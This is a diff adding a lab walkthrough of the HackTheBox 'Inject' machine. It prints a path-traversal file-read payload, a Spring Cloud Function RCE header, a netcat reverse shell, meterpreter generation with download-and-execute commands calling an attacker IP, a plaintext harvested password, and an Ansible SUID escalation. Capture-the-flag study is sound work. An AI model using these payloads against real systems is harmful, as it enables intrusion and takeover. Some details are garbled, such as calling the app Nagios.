@@ -143,14 +143,159 @@
 
         <h1>[Easy] Inject</h1>
         <img class="box-icon" src="/hack/images/inject.png"></img>
-        <p><i>Full compromise on April 17, 2023</br>Written on March 21, 2024</i></p>
-        <p>Inject is my 10th machine to compromise on HackTheBox. 
+        <p><i>Full compromise on April 19, 2023</br>Written on March 28, 2024</i></p>
+        <p>Inject is my 10th machine to compromise on HackTheBox. This Linux machine features a Local File Inclusion vulnerability for file read,
+            a vulnerable SpringBoot dependency for RCE, and abusing a cronjob running Ansible for privilege escalation.
         </p>
         <h2>Enumeration</h2>
         <h3>Nmap</h3>
         <p>Let's start with an Nmap scan.</p>
-        <pre><code>nmap 10.10.11.186 -p- --min-rate=3000</code></pre>
+        <pre><code>nmap 10.10.11.204 -p- --min-rate=3000</code></pre>
         <img src="../images/inject2.png">
+        <p>Ports 22 and 8080 are open. Let's use Nmap again to get more information.</p>
+        <pre><code>nmap 10.10.11.204 -p22,8080 --min-rate=3000</code></pre>
+        <img src="../images/inject3.png">
+        <p>It looks like we're dealing with just a web application running Nagios on port 8080. Let's navigate to http://10.10.11.204:8080 in our browser.</p>
+        
+        <h3>TCP Port 8080 - Nagios</h3>
+        <p>We are greeted with the following webpage:</p>
+        <img src="../images/inject4.png">
+        <p>Poking around the website, most of the buttons don't work. There is a "Sign Up" button but it shows a "Under Construction" page.</p>
+        <img src="../images/inject5.png">
+        <p>The website does have a blogs page, but all of the links on that page doesn't work either.</p>
+        <img src="../images/inject6.png">
+        
+        <h2>Exploit - Local File Inclusion</h2>
+        <p>Interestingly, there is an upload page. We're able to upload an image file and view it.</p>
+        <img src="../images/inject7.png">
+        </br>
+        <img src="../images/inject8.png">
+        <p>Can we upload anything else other than an image file? Maybe we can upload a PHP file and get a web shell.</p>
+        <img src="../images/inject9.png">
+        <p>Never mind, only image files are accepted.</p>
+        <p>Going back to our image file, I've noticed that the web application grabs/shows the image via the value in the "img" parameter in the URL.
+            What if we instead change "/show_image?img=test.png" to "/show_image?img=/etc/passwd" ?</p>
+        <img src="../images/inject10.png">
+        <p>It shows an internal server error. What if we change it to "/show_image?img=../../../../../../../../../etc/passwd" ?</p>
+        <img src="../images/inject11.png">
+        <p>It shows a different error related to our Firefox browser, not from the web application. This means that our browser is expecting image data to be received,
+            but it got something else that's not an image. If we use BurpSuite and inspect what we received, we see that we got the /etc/passwd file. This confirms
+            that the web application is vulnerable to Local File Inclusion (LFI) and we're able to read local files from the target machine.</p>
+        <img src="../images/inject12.png">
+        <p>We can use "." or ".." to list files in the directory. The current directory didn't have anything, but the previous directory does. From the result we can see three directories. The java directory tells us that this is a 
+            Java application. Java web applications usually have a pom.xml file which holds information and version numbers on dependencies. From there, I can see if the
+            web application is using any vulnerable dependencies.</p>
+        <img src="../images/inject13.png">
+        <p>We can easily find the pom.xml file just three directories above.</p>
+        <img src="../images/inject14.png">
+        <p>Here's some of the content of the pom.xml file:</p>
+        <img src="../images/inject15.png">
+        <p>For each dependency in the pom.xml file, I searched for a vulnerability with their version number. The dependency spring-cloud-function-web has a RCE vulnerability.</p>
+        <img src="../images/inject16.png">
+
+        <h2>Exploit - spring-cloud-function-web RCE</h2>
+        <p>Using Exploit-DB as a reference, the exploit code shows that it is making a POST request to /functionRouter with an added header called spring.cloud.function.routing-expression.
+           Then in that header, the command to be executed is passed into it and sent to the target. </p>
+        <img src="../images/inject17.png">
+        <p>We can try this with our own request on BurpSuite. We'll test if the target is able to send a GET request to a Python web server hosted on our attack machine. That way, we can see if 
+            we received a request from the target, which means that our command was executed successfully.</p>
+        <p>We'll first start our web server.</p>
+        <pre><code>python3 -m http.server</code></pre>
+        <img src="../images/inject18.png">
+        <p>Then we'll craft our exploit to send to the target.</p>
+        <pre><code>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.4:8000/test")</code></pre>
+        <img src="../images/inject19.png">
+        <p>Once sent, we can see that we received a request on our Python web server! This confirms we have RCE.</p>
+        <img src="../images/inject20.png">
+        <p>Now let's try getting a reverse shell into the target. First we set up our reverse shell listener:</p>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <img src="../images/inject21.png">
+        <p>Then we'll modify our exploit to make the target send a reverse shell to us.</p>
+        <pre><code>spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.4 4444 >/tmp/f")</code></pre>
+        <img src="../images/inject22.png">
+        <p>Unfortunately, this doesn't work. Other reverse shell codes from revshells.com don't work either. As a workaround, I'll prepare a meterpreter executable on my machine, use RCE
+            to download it to a file on the target machine, and execute it. </p>
+        <p>First I'll prepare the executable on my machine.</p>
+        <pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f elf -o backup.elf</code></pre>
+        <img src="../images/inject23.png">
+        <p>Then I'll prepare new listener that will handle the meterpreter reverse shell.</p>
+        <pre><code>msfconsole</br>use multi/handler</br>set payload linux/x64/meterpreter/reverse_tcp</br>set lhost 10.10.14.4</br>set lport 4444</br>run</code></pre>
+        <img src="../images/inject24.png">
+        <p>Then I'll modify our RCE exploit to make the target download the executable meterpreter reverse shell and store it in the /tmp path.</p>
+        <pre><code>spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.4:8000/backup.elf -o /tmp/backup.elf")</code></pre>
+        <img src="../images/inject25.png">
+        <p>Then I'll modify our RCE exploit to give execute permissions on /tmp/backup.elf.</p>
+        <pre><code>spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/backup.elf")</code></pre>
+        <img src="../images/inject26.png">
+        <p>Finally, I'll modify our RCE exploit once more to execute /tmp/backup.elf.</p>
+        <pre><code>spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("/tmp/backup.elf")</code></pre>
+        <img src="../images/inject27.png">
+        <p>On our listener, we have a reverse shell as user frank.</p>
+        <pre><code>whoami</code></pre>
+        <img src="../images/inject28.png">
+
+        <h2>Privilege Escalation - Ansible </h2>
+        <p>I'll upgrade our reverse shell using Python.</p>
+        <pre><code>python3 -c "import pty; pty.spawn('/bin/bash')";</br>id</code></pre>
+        <img src="../images/inject29.png">
+        <p>Unfortunately, there's no user.txt flag to be found yet in frank's home directory, but we do see an interesting hidden directory named .m2.</p>
+        <pre><code>cd ~</br>ls -la</code></pre>
+        <img src="../images/inject30.png">
+        <p>Inside the .m2 directory, we can find a file named settings.xml. Inside the settings.xml file, we can find credentials for user phil.</p>
+        <pre><code>cd .m2</br>ls -la</br>cat settings.xml</code></pre>
+        <img src="../images/inject31.png">
+        <p>Trying phil's credential doesn't work for SSH, but we can use su to laterally move to phil.</p>
+        <pre><code>su phil</br>DocPhillovestoInject123</br>whoami</code></pre>
+        <img src="../images/inj a ect32.png">
+        <p>Now we have user.txt flag.</p>
+        <pre><code>cd ~</br>ls -la</br>cat user.txt</code></pre>
+        <img src="../images/inject33.png">
+        <p>Doing normal enumeration for privilege escalation, we see that phil is part of a group called "staff".</p>
+        <pre><code>id</code></pre>
+        <img src="../images/inject34.png">
+        <p>If we search for writable directories by the staff group, we find an interesting directory: /opt/automation/tasks.</p>
+        <pre><code>find / -writable -type d -group staff 2>/dev/null</code></pre>
+        <img src="../images/inject35.png">
+        <p>Searching into that directory, we can see one file named playbook_1.yml that contains Ansible code. Ansible is mainly used for automating tasks.</p>
+        <pre><code>cd /opt/automation/tasks</br>ls -la</br>cat playbook_1.yml</code></pre>
+        <img src="../images/inject36.png">
+        <p>We can safely assume that this file is being executed every X minutes, judging by the directory name and the usage of Ansible code. Unfortunately, we're
+            unable to edit the playbook_1.yml as it only has write permissions to root user.</p>
+        <p>We can check what is being run along with their commands by using a tool named pspy. I already have it downloaded on the attack machine.
+            With my Python web server still running, I can download the file to the target machine.</p>
+        <pre><code>curl http://10.10.14.4:8000/pspy64 -o /tmp/pspy64</code></pre>
+        <img src="../images/inject37.png">
+        <p>I'll then give it execute permissions and run the file.</p>
+        <pre><code>chmod +x /tmp/pspy64</br>/tmp/pspy64</code></pre>
+        <img src="../images/inject38.png">
+        <p>From the output, the command "/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml" is being run every minute. This means that any file 
+            in the /opt/automation/tasks/ directory that ends with .yml will be run by Ansible. This command is also run by root, since the ID of the user running
+            the command is 0.</p>
+        <img src="../images/inject39.png">
+        <p>Searching for a privilege escalation technique with automated Ansible tasks, we find this article:</p>
+        <img src="../images/inject40.png">
+        <p>This will turn the binary /bin/bash into a SUID binary. This means that the binary can be run as another user. Since user root is making the SUID binary, /bin/bash
+            can be run as root.</p>
+        <p>First I'll create the file on my attack machine.</p>
+        <pre><code>nano evil.yml</br>cat evil.yml</code></pre>
+        <img src="../images/inject41.png">
+        <p>Then I'll download it to the attack machine and save it to /opt/automation/tasks/evil.yml.</p>
+        <pre><code>curl http://10.10.14.4:8000/evil.yml -o /opt/automation/tasks/evil.yml</code></pre>
+        <img src="../images/inject42.png">
+        <p>As the minute on the clock changed, I checked for a SUID bit on /bin/bash. Confirming that the SUID bit is set, I got shell as root and got the root.txt flag.</p>
+        <pre><code>ls -la /bin/bash</br>/bin/bash -p</br>whoami</br>cat /root/root.txt</code></pre>
+        <img src="../images/inject43.png">
+
+
+
+
+
+
+
+
+
+
+
         
 
     </div>
